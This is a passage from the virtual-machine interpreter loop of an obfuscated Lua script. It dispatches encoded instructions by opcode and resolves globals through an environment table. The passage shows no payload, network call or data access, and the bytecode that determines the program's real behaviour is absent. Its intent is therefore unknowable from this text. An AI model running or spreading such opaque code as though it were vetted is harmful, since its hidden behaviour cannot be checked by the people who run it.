                      Stk[Inst[2]] = Stk[Inst[3]][Inst[4]];
                      VIP = VIP + 1;
                      Inst = Instr[VIP];
                      Stk[Inst[2]] = Stk[Inst[3]][Inst[4]];
                      VIP = VIP + 1;
                      Inst = Instr[VIP];
                      Stk[Inst[2]][Inst[3]] = Inst[4];
                      VIP = VIP + 1;
                      Inst = Instr[VIP];
                      Stk[Inst[2]] = Stk[Inst[3]][Inst[4]];
                      VIP = VIP + 1;
                      Inst = Instr[VIP];
                      Stk[Inst[2]] = Stk[Inst[3]][Inst[4]];
                      VIP = VIP + 1;
                      Inst = Instr[VIP];
                      Stk[Inst[2]][Inst[3]] = Inst[4];
                      VIP = VIP + 1;
                      Inst = Instr[VIP];
                      if ((Inst[3] == "_ENV") or (Inst[3] == "getfenv")) then
                        Stk[Inst[2]] = Env;
                      else
                        Stk[Inst[2]] = Env[Inst[3]];
                      end
                      VIP = VIP + 1;
                      Inst = Instr[VIP];
                      Stk[Inst[2]] = Stk[Inst[3]][Inst[4]];
                      VIP = VIP + 1;
                      Inst = Instr[VIP];
                      Stk[Inst[2]] = Stk[Inst[3]][Inst[4]];
                      VIP = VIP + 1;
                      Inst = Instr[VIP];
                      Stk[Inst[2]] = Stk[Inst[3]][Inst[4]];
                      VIP = VIP + 1;
                      Inst = Instr[VIP];
                      Stk[Inst[2]] = Stk[Inst[3]][Inst[4]];
                      VIP = VIP + 1;
                      Inst = Instr[VIP];
                      Stk[Inst[2]][Inst[3]] = Inst[4];
                    elseif (Enum == 13) then
                      local Edx;
                      local Results, Limit;
                      local B;
                      local A;
                      if ((Inst[3] == "_ENV") or (Inst[3] == "getfenv")) then
                        Stk[Inst[2]] = Env;
                      else
                        Stk[Inst[2]] = Env[Inst[3]];
                      end
                      VIP = VIP + 1;
                      Inst = Instr[VIP];
                      A = Inst[2];
                      B = Stk[Inst[3]];
                      Stk[A + 1] = B;
                      Stk[A] = B[Inst[4]];
                      VIP = VIP + 1;
                      Inst = Instr[VIP];
                      Stk[Inst[2]] = Inst[3];
                      VIP = VIP + 1;
                      Inst = Instr[VIP];
                      A = Inst[2];
                      Stk[A] = Stk[A](Unpack(Stk, A + 1, Inst[3]));
                      VIP = VIP + 1;
                      Inst = Instr[VIP];
                      A = Inst[2];
                      B = Stk[Inst[3]];
                      Stk[A + 1] = B;
                      Stk[A] = B[Inst[4]];
                      VIP = VIP + 1;
                      Inst = Instr[VIP];
                      Stk[Inst[2]] = Inst[3];
                      VIP = VIP + 1;
                      Inst = Instr[VIP];
                      A = Inst[2];
                      Stk[A] = Stk[A](Unpack(Stk, A + 1, Inst[3]));
                      VIP = VIP + 1;
                      Inst = Instr[VIP];
                      A = Inst[2];
                      B = Stk[Inst[3]];
                      Stk[A + 1] = B;
                      Stk[A] = B[Inst[4]];
                      VIP = VIP + 1;
                      Inst = Instr[VIP];
                      Stk[Inst[2]] = Inst[3];
                      VIP = VIP + 1;
                      Inst = Instr[VIP];
                      A = Inst[2];
                      Results, Limit = _R(Stk[A](Unpack(Stk, A + 1, Inst[3])));
                      Top = (Limit + A) - 1;
                      Edx = 0;
                      for Idx = A, Top do
                        Edx = Edx + 1;
                        Stk[Idx] = Results[Edx];
                      end
                      VIP = VIP + 1;
                      Inst = Instr[VIP];
                      A = Inst[2];
                      Stk[A] = Stk[A](Unpack(Stk, A + 1, Top));
                      VIP = VIP + 1;
                      Inst = Instr[VIP];
                      Stk[Inst[2]] = Stk[Inst[3]][Inst[4]];
                      VIP = VIP + 1;
                      Inst = Instr[VIP];
                      if ((Inst[3] == "_ENV") or (Inst[3] == "getfenv")) then
                        Stk[Inst[2]] = Env;
                      else
                        Stk[Inst[2]] = Env[Inst[3]];
                      end
                      VIP = VIP + 1;
                      Inst = Instr[VIP];
                      A = Inst[2];
                      B = Stk[Inst[3]];
                      Stk[A + 1] = B;
                      Stk[A] = B[Inst[4]];
                      VIP = VIP + 1;
                      Inst = Instr[VIP];
                      Stk[Inst[2]] = Inst[3];
                      VIP = VIP + 1;
                      Inst = Instr[VIP];
                      A = Inst[2];
                      Stk[A] = Stk[A](Unpack(Stk, A + 1, Inst[3]));
                      VIP = VIP + 1;
                      Inst = Instr[VIP];
                      Stk[Inst[2]] = Stk[Inst[3]][Inst[4]];
                      VIP = VIP + 1;
                      Inst = Instr[VIP];
                      Stk[Inst[2]] = Stk[Inst[3]][Inst[4]];
                      VIP = VIP + 1;
                      Inst = Instr[VIP];
                      Stk[Inst[2]] = Stk[Inst[3]][Inst[4]];
                      VIP = VIP + 1;
                      Inst = Instr[VIP];
                      A = Inst[2];
                      B = Stk[Inst[3]];
                      Stk[A + 1] = B;
                      Stk[A] = B[Inst[4]];
                    else
                      local A;
                      Stk[Inst[2]] = Inst[3];
                      VIP = VIP + 1;
                      Inst = Instr[VIP];
                      Stk[Inst[2]] = Inst[3];
                      VIP = VIP + 1;
                      Inst = Instr[VIP];
                      Stk[Inst[2]] = Inst[3];
                      VIP = VIP + 1;
                      Inst = Instr[VIP];
                      A = Inst[2];
                      Stk[A] = Stk[A](Unpack(Stk, A + 1, Inst[3]));
                      VIP = VIP + 1;
                      Inst = Instr[VIP];
                      Stk[Inst[2]][Inst[3]] = Stk[Inst[4]];
                      VIP = VIP + 1;
                      Inst = Instr[VIP];
                      if ((Inst[3] == "_ENV") or (Inst[3] == "getfenv")) then
                        Stk[Inst[2]] = Env;
                      else
                        Stk[Inst[2]] = Env[Inst[3]];
                      end
                      VIP = VIP + 1;
                      Inst = Instr[VIP];
                      Stk[Inst[2]] = Stk[Inst[3]][Inst[4]];
                      VIP = VIP + 1;
                      Inst = Instr[VIP];
                      Stk[Inst[2]] = Inst[3];
                      VIP = VIP + 1;
                      Inst = Instr[VIP];
                      Stk[Inst[2]] = Inst[3];
                      VIP = VIP + 1;
                      Inst = Instr[VIP];
                      Stk[Inst[2]] = Inst[3];
                    end
                  elseif (Enum <= 15) then
                    local B;
                    local A;
                    A = Inst[2];
                    Stk[A](Unpack(Stk, A + 1, Inst[3]));
                    VIP = VIP + 1;
                    Inst = Instr[VIP];
                    A = Inst[2];
                    B = Stk[Inst[3]];
                    Stk[A + 1] = B;
                    Stk[A] = B[Inst[4]];
                    VIP = VIP + 1;
                    Inst = Instr[VIP];
                    Stk[Inst[2]] = Inst[3];
                    VIP = VIP + 1;
                    Inst = Instr[VIP];
                    A = Inst[2];
                    Stk[A](Unpack(Stk, A + 1, Inst[3]));
                    VIP = VIP + 1;
                    Inst = Instr[VIP];
                    A = Inst[2];
                    B = Stk[Inst[3]];
                    Stk[A + 1] = B;
                    Stk[A] = B[Inst[4]];
                    VIP = VIP + 1;
                    Inst = Instr[VIP];
                    Stk[Inst[2]] = Inst[3];
                    VIP = VIP + 1;
                    Inst = Instr[VIP];
                    Stk[Inst[2]] = Inst[3];
                  elseif (Enum > 16) then
                    Stk[Inst[2]] = Stk[Inst[3]][Inst[4]];
                    VIP = VIP + 1;
                    Inst = Instr[VIP];
                    Stk[Inst[2]] = Stk[Inst[3]][Inst[4]];
                    VIP = VIP + 1;
                    Inst = Instr[VIP];
                    Stk[Inst[2]][Inst[3]] = Inst[4];
                    VIP = VIP + 1;
                    Inst = Instr[VIP];
                    Stk[Inst[2]] = Stk[Inst[3]][Inst[4]];
                    VIP = VIP + 1;
                    Inst = Instr[VIP];
                    Stk[Inst[2]] = Stk[Inst[3]][Inst[4]];
                    VIP = VIP + 1;
                    Inst = Instr[VIP];
                    Stk[Inst[2]][Inst[3]] = Inst[4];
                    VIP = VIP + 1;
                    Inst = Instr[VIP];
                    Stk[Inst[2]] = Stk[Inst[3]][Inst[4]];
                    VIP = VIP + 1;
                    Inst = Instr[VIP];
                    Stk[Inst[2]] = Stk[Inst[3]][Inst[4]];
                    VIP = VIP + 1;
                    Inst = Instr[VIP];
                    Stk[Inst[2]][Inst[3]] = Inst[4];
                    VIP = VIP + 1;
                    Inst = Instr[VIP];
                    Stk[Inst[2]] = Stk[Inst[3]][Inst[4]];
                  else
                    local B;
                    local A;
                    if ((Inst[3] == "_ENV") or (Inst[3] == "getfenv")) then
                      Stk[Inst[2]] = Env;
                    else
                      Stk[Inst[2]] = Env[Inst[3]];
                    end
                    VIP = VIP + 1;
                    Inst = Instr[VIP];
                    Stk[Inst[2]] = Stk[Inst[3]][Inst[4]];
                    VIP = VIP + 1;
                    Inst = Instr[VIP];
                    Stk[Inst[2]] = Stk[Inst[3]][Inst[4]];
                    VIP = VIP + 1;
                    Inst = Instr[VIP];
                    Stk[Inst[2]] = Stk[Inst[3]][Inst[4]];
                    VIP = VIP + 1;
                    Inst = Instr[VIP];
                    Stk[Inst[2]] = Stk[Inst[3]][Inst[4]];
                    VIP = VIP + 1;
                    Inst = Instr[VIP];
                    A = Inst[2];
                    B = Stk[Inst[3]];
                    Stk[A + 1] = B;
                    Stk[A] = B[Inst[4]];
                    VIP = VIP + 1;
                    Inst = Instr[VIP];
                    A = Inst[2];
                    Stk[A] = Stk[A](Stk[A + 1]);
                    VIP = VIP + 1;
                    Inst = Instr[VIP];
                    if ((Inst[3] == "_ENV") or (Inst[3] == "getfenv")) then
                      Stk[Inst[2]] = Env;
                    else
                      Stk[Inst[2]] = Env[Inst[3]];
                    end
                    VIP = VIP + 1;
                    Inst = Instr[VIP];
                    Stk[Inst[2]] = Stk[Inst[3]][Inst[4]];
                    VIP = VIP + 1;
                    Inst = Instr[VIP];
                    Stk[Inst[2]] = Stk[Inst[3]][Inst[4]];
                    VIP = VIP + 1;
                    Inst = Instr[VIP];
                    if (Stk[Inst[2]] == Stk[Inst[4]]) then
                      VIP = VIP + 1;
                    else
                      VIP = Inst[3];
                    end
                  end
                elseif (Enum <= 20) then
                  if (Enum <= 18) then
                    Stk[Inst[2]][Inst[3]] = Inst[4];
                  elseif (Enum == 19) then
                    local A;
                    Stk[Inst[2]] = Stk[Inst[3]][Inst[4]];
                    VIP = VIP + 1;
                    Inst = Instr[VIP];
                    Stk[Inst[2]] = Inst[3];
                    VIP = VIP + 1;
                    Inst = Instr[VIP];
                    if ((Inst[3] == "_ENV") or (Inst[3] == "getfenv")) then
                      Stk[Inst[2]] = Env;
                    else
                      Stk[Inst[2]] = Env[Inst[3]];
                    end
                    VIP = VIP + 1;
                    Inst = Instr[VIP];
                    Stk[Inst[2]] = Stk[Inst[3]] / Inst[4];
                    VIP = VIP + 1;
                    Inst = Instr[VIP];
                    A = Inst[2];
                    Stk[A] = Stk[A](Unpack(Stk, A + 1, Inst[3]));
                    VIP = VIP + 1;
                    Inst = Instr[VIP];
                    Env[Inst[3]] = Stk[Inst[2]];
                    VIP = VIP + 1;
                    Inst = Instr[VIP];
                    if ((Inst[3] == "_ENV") or (Inst[3] == "getfenv")) then
                      Stk[Inst[2]] = Env;
                    else
                      Stk[Inst[2]] = Env[Inst[3]];
                    end
                    VIP = VIP + 1;
                    Inst = Instr[VIP];
                    Stk[Inst[2]]();
                  else
                    local B;
                    local A;
                    if ((Inst[3] == "_ENV") or (Inst[3] == "getfenv")) then
                      Stk[Inst[2]] = Env;
                    else
                      Stk[Inst[2]] = Env[Inst[3]];
                    end
                    VIP = VIP + 1;
                    Inst = Instr[VIP];
                    Stk[Inst[2]] = Stk[Inst[3]][Inst[4]];
                    VIP = VIP + 1;
                    Inst = Instr[VIP];
                    Stk[Inst[2]] = Stk[Inst[3]][Inst[4]];
                    VIP = VIP + 1;
                    Inst = Instr[VIP];
                    Stk[Inst[2]] = Stk[Inst[3]][Inst[4]];
                    VIP = VIP + 1;
                    Inst = Instr[VIP];
                    A = Inst[2];
                    B = Stk[Inst[3]];
                    Stk[A + 1] = B;
                    Stk[A] = B[Inst[4]];
                    VIP = VIP + 1;
                    Inst = Instr[VIP];
                    Stk[Inst[2]] = Inst[3];
                    VIP = VIP + 1;
                    Inst = Instr[VIP];
                    Stk[Inst[2]] = Inst[3];
                    VIP = VIP + 1;
                    Inst = Instr[VIP];
                    A = Inst[2];
                    Stk[A](Unpack(Stk, A + 1, Inst[3]));
                    VIP = VIP + 1;
                    Inst = Instr[VIP];
                    do
                      return;
                    end
                  end
                elseif (Enum <= 22) then
                  if (Enum > 21) then
                    local B;
                    local A;
                    if ((Inst[3] == "_ENV") or (Inst[3] == "getfenv")) then
                      Stk[Inst[2]] = Env;
                    else
                      Stk[Inst[2]] = Env[Inst[3]];
                    end
                    VIP = VIP + 1;
                    Inst = Instr[VIP];
                    Stk[Inst[2]] = Stk[Inst[3]][Inst[4]];
                    VIP = VIP + 1;
                    Inst = Instr[VIP];
                    Stk[Inst[2]] = Stk[Inst[3]][Inst[4]];
                    VIP = VIP + 1;
                    Inst = Instr[VIP];
                    Stk[Inst[2]] = Stk[Inst[3]][Inst[4]];
                    VIP = VIP + 1;
                    Inst = Instr[VIP];
                    A = Inst[2];
                    B = Stk[Inst[3]];
                    Stk[A + 1] = B;
                    Stk[A] = B[Inst[4]];
                    VIP = VIP + 1;
                    Inst = Instr[VIP];
                    Stk[Inst[2]] = Inst[3];
                    VIP = VIP + 1;
                    Inst = Instr[VIP];
                    Stk[Inst[2]] = Inst[3];
                    VIP = VIP + 1;
                    Inst = Instr[VIP];
                    A = Inst[2];
                    Stk[A](Unpack(Stk, A + 1, Inst[3]));
                    VIP = VIP + 1;
                    Inst = Instr[VIP];
                    do
                      return;
                    end
                  else
                    local Edx;
                    local Results, Limit;
                    local B;
                    local A;
                    if ((Inst[3] == "_ENV") or (Inst[3] == "getfenv")) then
                      Stk[Inst[2]] = Env;
                    else
                      Stk[Inst[2]] = Env[Inst[3]];
                    end
                    VIP = VIP + 1;
                    Inst = Instr[VIP];
                    if ((Inst[3] == "_ENV") or (Inst[3] == "getfenv")) then
                      Stk[Inst[2]] = Env;
                    else
                      Stk[Inst[2]] = Env[Inst[3]];
                    end
                    VIP = VIP + 1;
                    Inst = Instr[VIP];
                    A = Inst[2];
                    B = Stk[Inst[3]];
                    Stk[A + 1] = B;
                    Stk[A] = B[Inst[4]];
                    VIP = VIP + 1;
                    Inst = Instr[VIP];
                    Stk[Inst[2]] = Inst[3];
                    VIP = VIP + 1;
                    Inst = Instr[VIP];
                    Stk[Inst[2]] = Inst[3] ~= 0;
                    VIP = VIP + 1;
                    Inst = Instr[VIP];
                    A = Inst[2];
                    Results, Limit = _R(Stk[A](Unpack(Stk, A + 1, Inst[3])));
                    Top = (Limit + A) - 1;
                    Edx = 0;
                    for Idx = A, Top do
                      Edx = Edx + 1;
                      Stk[Idx] = Results[Edx];
                    end
                    VIP = VIP + 1;
                    Inst = Instr[VIP];
                    A = Inst[2];
                    Stk[A] = Stk[A](Unpack(Stk, A + 1, Top));
                    VIP = VIP + 1;
                    Inst = Instr[VIP];
                    Stk[Inst[2]]();
                    VIP = VIP + 1;
                    Inst = Instr[VIP];
                    do
                      return;
                    end
                  end
                elseif (Enum > 23) then
                  Stk[Inst[2]] = Stk[Inst[3]] / Inst[4];
                else
                  local Edx;
                  local Results, Limit;
                  local B;
                  local A;
                  if ((Inst[3] == "_ENV") or (Inst[3] == "getfenv")) then
                    Stk[Inst[2]] = Env;
                  else
                    Stk[Inst[2]] = Env[Inst[3]];
                  end
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  if ((Inst[3] == "_ENV") or (Inst[3] == "getfenv")) then
                    Stk[Inst[2]] = Env;
                  else
                    Stk[Inst[2]] = Env[Inst[3]];
                  end
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  A = Inst[2];
                  B = Stk[Inst[3]];
                  Stk[A + 1] = B;
                  Stk[A] = B[Inst[4]];
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  Stk[Inst[2]] = Inst[3];
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  Stk[Inst[2]] = Inst[3] ~= 0;
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  A = Inst[2];
                  Results, Limit = _R(Stk[A](Unpack(Stk, A + 1, Inst[3])));
                  Top = (Limit + A) - 1;
                  Edx = 0;
                  for Idx = A, Top do
                    Edx = Edx + 1;
                    Stk[Idx] = Results[Edx];
                  end
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  A = Inst[2];
                  Stk[A] = Stk[A](Unpack(Stk, A + 1, Top));
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  Stk[Inst[2]]();
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  do
                    return;
                  end
                end
              elseif (Enum <= 36) then
                if (Enum <= 30) then
                  if (Enum <= 27) then
                    if (Enum <= 25) then
                      local B;
                      local A;
                      A = Inst[2];
                      Stk[A](Unpack(Stk, A + 1, Inst[3]));
                      VIP = VIP + 1;
                      Inst = Instr[VIP];
                      Stk[Inst[2]] = Inst[3];
                      VIP = VIP + 1;
                      Inst = Instr[VIP];
                      A = Inst[2];
                      B = Stk[Inst[3]];
                      Stk[A + 1] = B;
                      Stk[A] = B[Stk[Inst[4]]];
                      VIP = VIP + 1;
                      Inst = Instr[VIP];
                      Stk[Inst[2]] = Inst[3];
                      VIP = VIP + 1;
                      Inst = Instr[VIP];
                      Stk[Inst[2]] = Inst[3];
                    elseif (Enum > 26) then
                      Stk[Inst[2]][Stk[Inst[3]]] = Stk[Inst[4]];
                    else
                      local A = Inst[2];
                      local Results, Limit = _R(Stk[A](Unpack(Stk, A + 1, Inst[3])));
                      Top = (Limit + A) - 1;
                      local Edx = 0;
                      for Idx = A, Top do
                        Edx = Edx + 1;
                        Stk[Idx] = Results[Edx];
                      end
                    end
                  elseif (Enum <= 28) then
                    Stk[Inst[2]] = Inst[3];
                    VIP = VIP + 1;
                    Inst = Instr[VIP];
                    Stk[Inst[2]] = Inst[3];
                    VIP = VIP + 1;
                    Inst = Instr[VIP];
                    Stk[Inst[2]] = Inst[3];
                    VIP = VIP + 1;
                    Inst = Instr[VIP];
                    Stk[Inst[2]] = Inst[3];
                    VIP = VIP + 1;
                    Inst = Instr[VIP];
                    Stk[Inst[2]] = Inst[3];
                    VIP = VIP + 1;
                    Inst = Instr[VIP];
                    Stk[Inst[2]] = Inst[3];
                    VIP = VIP + 1;
                    Inst = Instr[VIP];
                    Stk[Inst[2]] = Inst[3];
                    VIP = VIP + 1;
                    Inst = Instr[VIP];
                    Stk[Inst[2]] = Inst[3];
                    VIP = VIP + 1;
                    Inst = Instr[VIP];
                    Stk[Inst[2]] = Inst[3];
                    VIP = VIP + 1;
                    Inst = Instr[VIP];
                    Stk[Inst[2]] = Inst[3];
                  elseif (Enum == 29) then
                    local Edx;
                    local Results, Limit;
                    local B;
                    local A;
                    if ((Inst[3] == "_ENV") or (Inst[3] == "getfenv")) then
                      Stk[Inst[2]] = Env;
                    else
                      Stk[Inst[2]] = Env[Inst[3]];
                    end
                    VIP = VIP + 1;
                    Inst = Instr[VIP];
                    if ((Inst[3] == "_ENV") or (Inst[3] == "getfenv")) then
                      Stk[Inst[2]] = Env;
                    else
                      Stk[Inst[2]] = Env[Inst[3]];
                    end
                    VIP = VIP + 1;
                    Inst = Instr[VIP];
                    A = Inst[2];
                    B = Stk[Inst[3]];
                    Stk[A + 1] = B;
                    Stk[A] = B[Inst[4]];
                    VIP = VIP + 1;
                    Inst = Instr[VIP];
                    Stk[Inst[2]] = Inst[3];
                    VIP = VIP + 1;
                    Inst = Instr[VIP];
                    A = Inst[2];
                    Results, Limit = _R(Stk[A](Unpack(Stk, A + 1, Inst[3])));
                    Top = (Limit + A) - 1;
                    Edx = 0;
                    for Idx = A, Top do
                      Edx = Edx + 1;
                      Stk[Idx] = Results[Edx];
                    end
                    VIP = VIP + 1;
                    Inst = Instr[VIP];
                    A = Inst[2];
                    Stk[A] = Stk[A](Unpack(Stk, A + 1, Top));
                    VIP = VIP + 1;
                    Inst = Instr[VIP];
                    Stk[Inst[2]]();
                    VIP = VIP + 1;
                    Inst = Instr[VIP];
                    do
                      return;
                    end
                  else
                    local Edx;
                    local Results, Limit;
                    local B;
                    local A;
                    if ((Inst[3] == "_ENV") or (Inst[3] == "getfenv")) then
                      Stk[Inst[2]] = Env;
                    else
                      Stk[Inst[2]] = Env[Inst[3]];
                    end
                    VIP = VIP + 1;
                    Inst = Instr[VIP];
                    if ((Inst[3] == "_ENV") or (Inst[3] == "getfenv")) then
                      Stk[Inst[2]] = Env;
                    else
                      Stk[Inst[2]] = Env[Inst[3]];
                    end
                    VIP = VIP + 1;
                    Inst = Instr[VIP];
                    A = Inst[2];
                    B = Stk[Inst[3]];
                    Stk[A + 1] = B;
                    Stk[A] = B[Inst[4]];
                    VIP = VIP + 1;
                    Inst = Instr[VIP];
                    Stk[Inst[2]] = Inst[3];
                    VIP = VIP + 1;
                    Inst = Instr[VIP];
                    A = Inst[2];
                    Results, Limit = _R(Stk[A](Unpack(Stk, A + 1, Inst[3])));
                    Top = (Limit + A) - 1;
                    Edx = 0;
                    for Idx = A, Top do
                      Edx = Edx + 1;
                      Stk[Idx] = Results[Edx];
                    end
                    VIP = VIP + 1;
                    Inst = Instr[VIP];
                    A = Inst[2];
                    Stk[A] = Stk[A](Unpack(Stk, A + 1, Top));
                    VIP = VIP + 1;
                    Inst = Instr[VIP];
                    Stk[Inst[2]]();
                    VIP = VIP + 1;
                    Inst = Instr[VIP];
                    do
                      return;
                    end
                  end
                elseif (Enum <= 33) then
                  if (Enum <= 31) then
                    local K;
                    local B;
                    local A;
                    A = Inst[2];
                    B = Stk[Inst[3]];
                    Stk[A + 1] = B;
                    Stk[A] = B[Inst[4]];
                    VIP = VIP + 1;
                    Inst = Instr[VIP];
                    Stk[Inst[2]] = Inst[3];
                    VIP = VIP + 1;
                    Inst = Instr[VIP];
                    A = Inst[2];
                    Stk[A] = Stk[A](Unpack(Stk, A + 1, Inst[3]));
                    VIP = VIP + 1;
                    Inst = Instr[VIP];
                    A = Inst[2];
                    B = Stk[Inst[3]];
                    Stk[A + 1] = B;
                    Stk[A] = B[Inst[4]];
                    VIP = VIP + 1;
                    Inst = Instr[VIP];
                    if ((Inst[3] == "_ENV") or (Inst[3] == "getfenv")) then
                      Stk[Inst[2]] = Env;
                    else
                      Stk[Inst[2]] = Env[Inst[3]];
                    end
                    VIP = VIP + 1;
                    Inst = Instr[VIP];
                    Stk[Inst[2]] = Stk[Inst[3]][Inst[4]];
                    VIP = VIP + 1;
                    Inst = Instr[VIP];
                    A = Inst[2];
                    Stk[A] = Stk[A](Unpack(Stk, A + 1, Inst[3]));
                    VIP = VIP + 1;
                    Inst = Instr[VIP];
                    Stk[Inst[2]] = Stk[Inst[3]][Inst[4]];
                    VIP = VIP + 1;
                    Inst = Instr[VIP];
                    Stk[Inst[2]] = Inst[3];
                    VIP = VIP + 1;
                    Inst = Instr[VIP];
                    B = Inst[3];
                    K = Stk[B];
                    for Idx = B + 1, Inst[4] do
                      K = K .. Stk[Idx];
                    end
                    Stk[Inst[2]] = K;
                  elseif (Enum == 32) then
                    local A;
                    local K;
                    local B;
                    Stk[Inst[2]] = Inst[3];
                    VIP = VIP + 1;
                    Inst = Instr[VIP];
                    B = Inst[3];
                    K = Stk[B];
                    for Idx = B + 1, Inst[4] do
                      K = K .. Stk[Idx];
                    end
                    Stk[Inst[2]] = K;
                    VIP = VIP + 1;
                    Inst = Instr[VIP];
                    A = Inst[2];
                    Stk[A](Unpack(Stk, A + 1, Inst[3]));
                    VIP = VIP + 1;
                    Inst = Instr[VIP];
                    A = Inst[2];
                    B = Stk[Inst[3]];
                    Stk[A + 1] = B;
                    Stk[A] = B[Inst[4]];
                    VIP = VIP + 1;
                    Inst = Instr[VIP];
                    Stk[Inst[2]] = Inst[3];
                    VIP = VIP + 1;
                    Inst = Instr[VIP];
                    if ((Inst[3] == "_ENV") or (Inst[3] == "getfenv")) then
                      Stk[Inst[2]] = Env;
                    else
                      Stk[Inst[2]] = Env[Inst[3]];
                    end
                    VIP = VIP + 1;
                    Inst = Instr[VIP];
                    A = Inst[2];
                    B = Stk[Inst[3]];
                    Stk[A + 1] = B;
                    Stk[A] = B[Inst[4]];
                    VIP = VIP + 1;
                    Inst = Instr[VIP];
                    Stk[Inst[2]] = Inst[3];
                    VIP = VIP + 1;
                    Inst = Instr[VIP];
                    A = Inst[2];
                    Stk[A] = Stk[A](Unpack(Stk, A + 1, Inst[3]));
                    VIP = VIP + 1;
                    Inst = Instr[VIP];
                    Stk[Inst[2]] = Stk[Inst[3]][Inst[4]];
                  else
                    local B;
                    local A;
                    Stk[Inst[2]] = Upvalues[Inst[3]];
                    VIP = VIP + 1;
                    Inst = Instr[VIP];
                    Stk[Inst[2]][Inst[3]] = Inst[4];
                    VIP = VIP + 1;
                    Inst = Instr[VIP];
                    Stk[Inst[2]] = Upvalues[Inst[3]];
                    VIP = VIP + 1;
                    Inst = Instr[VIP];
                    Stk[Inst[2]][Inst[3]] = Inst[4];
                    VIP = VIP + 1;
                    Inst = Instr[VIP];
                    if ((Inst[3] == "_ENV") or (Inst[3] == "getfenv")) then
                      Stk[Inst[2]] = Env;
                    else
                      Stk[Inst[2]] = Env[Inst[3]];
                    end
                    VIP = VIP + 1;
                    Inst = Instr[VIP];
                    A = Inst[2];
                    B = Stk[Inst[3]];
                    Stk[A + 1] = B;
                    Stk[A] = B[Inst[4]];
                    VIP = VIP + 1;
                    Inst = Instr[VIP];
                    Stk[Inst[2]] = Inst[3];
                    VIP = VIP + 1;
                    Inst = Instr[VIP];
                    A = Inst[2];
                    Stk[A] = Stk[A](Unpack(Stk, A + 1, Inst[3]));
                    VIP = VIP + 1;
                    Inst = Instr[VIP];
                    A = Inst[2];
                    B = Stk[Inst[3]];
                    Stk[A + 1] = B;
                    Stk[A] = B[Inst[4]];
                    VIP = VIP + 1;
                    Inst = Instr[VIP];
                    Stk[Inst[2]] = Inst[3] ~= 0;
                  end
                elseif (Enum <= 34) then
                  local A;
                  Stk[Inst[2]] = Stk[Inst[3]][Stk[Inst[4]]];
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  Stk[Inst[2]] = Inst[3];
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  Stk[Inst[2]] = Inst[3];
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  Stk[Inst[2]] = Inst[3];
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  Stk[Inst[2]] = Inst[3];
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  A = Inst[2];
                  Stk[A] = Stk[A](Unpack(Stk, A + 1, Inst[3]));
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  Stk[Inst[2]][Stk[Inst[3]]] = Stk[Inst[4]];
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  Stk[Inst[2]] = Inst[3];
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  if ((Inst[3] == "_ENV") or (Inst[3] == "getfenv")) then
                    Stk[Inst[2]] = Env;
                  else
                    Stk[Inst[2]] = Env[Inst[3]];
                  end
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  Stk[Inst[2]] = Inst[3];
                elseif (Enum > 35) then
                  Stk[Inst[2]] = Stk[Inst[3]][Stk[Inst[4]]];
                else
                  local B;
                  local A;
                  if ((Inst[3] == "_ENV") or (Inst[3] == "getfenv")) then
                    Stk[Inst[2]] = Env;
                  else
                    Stk[Inst[2]] = Env[Inst[3]];
                  end
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  Stk[Inst[2]] = Stk[Inst[3]][Inst[4]];
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  Stk[Inst[2]] = Stk[Inst[3]][Inst[4]];
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  Stk[Inst[2]] = Stk[Inst[3]][Inst[4]];
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  A = Inst[2];
                  B = Stk[Inst[3]];
                  Stk[A + 1] = B;
                  Stk[A] = B[Inst[4]];
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  Stk[Inst[2]] = Inst[3];
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  Stk[Inst[2]] = Inst[3];
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  A = Inst[2];
                  Stk[A](Unpack(Stk, A + 1, Inst[3]));
                  VIP = VIP + 1;
                  Inst = Instr[VIP];
                  do
                    return;
                  end
                end
              elseif (Enum <= 42) then
                if (Enum <= 39) then
                  if (Enum <= 37) then
                    local Edx;
                    local Results, Limit;
                    local B;
                    local A;
                    if ((Inst[3] == "_ENV") or (Inst[3] == "getfenv")) then
                      Stk[Inst[2]] = Env;
                    else
                      Stk[Inst[2]] = Env[Inst[3]];
                    end
                    VIP = VIP + 1;
                    Inst = Instr[VIP];
                    if ((Inst[3] == "_ENV") or (Inst[3] == "getfenv")) then
                      Stk[Inst[2]] = Env;
                    else
                      Stk[Inst[2]] = Env[Inst[3]];
                    end
                    VIP = VIP + 1;
                    Inst = Instr[VIP];
                    A = Inst[2];
                    B = Stk[Inst[3]];
                    Stk[A + 1] = B;
                    Stk[A] = B[Inst[4]];
                    VIP = VIP + 1;
                    Inst = Instr[VIP];
                    Stk[Inst[2]] = Inst[3];
                    VIP = VIP + 1;
                    Inst = Instr[VIP];
                    A = Inst[2];
                    Results, Limit = _R(Stk[A](Unpack(Stk, A + 1, Inst[3])));
                    Top = (Limit + A) - 1;
                    Edx = 0;
                    for Idx = A, Top do
                      Edx = Edx + 1;
                      Stk[Idx] = Results[Edx];
                    end
                    VIP = VIP + 1;
                    Inst = Instr[VIP];
                    A = Inst[2];
                    Stk[A] = Stk[A](Unpack(Stk, A + 1, Top));
                    VIP = VIP + 1;
                    Inst = Instr[VIP];
                    Stk[Inst[2]]();
                    VIP = VIP + 1;
                    Inst = Instr[VIP];
                    do
                      return;
                    end
                  elseif (Enum > 38) then
                    local B;
                    local A;
